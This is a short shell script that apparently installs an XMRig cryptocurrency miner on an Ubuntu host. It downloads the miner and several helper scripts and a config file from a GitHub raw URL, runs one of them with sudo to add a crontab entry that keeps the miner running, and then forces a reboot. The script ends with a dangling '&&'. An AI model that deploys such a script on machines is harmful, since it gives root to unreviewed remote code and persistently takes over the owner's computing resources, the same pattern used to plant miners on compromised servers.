cd /home/ubuntu

wget https://raw.githubusercontent.com/659678/567580/main/xmrig1804.tar.gz
tar zxvf xmrig1804.tar.gz
mv xmrig-6.15.2 xmrig1804
cd xmrig1804/
rm -f config.json
wget https://raw.githubusercontent.com/659678/567580/main/xmr_r.sh
wget https://raw.githubusercontent.com/659678/567580/main/xmr_j.sh
wget https://raw.githubusercontent.com/659678/567580/main/xmr_cr.sh
wget https://raw.githubusercontent.com/659678/567580/main/config.json
chmod +x *
echo "Start Install Crontab"
sudo sh /home/ubuntu/xmrig1804/xmr_cr.sh
echo "checking crontab added...." && crontab -l -u ubuntu
echo "Done...."
cd ..
cd ..
cd /root
echo "Now system will reboot"
sudo reboot
&&
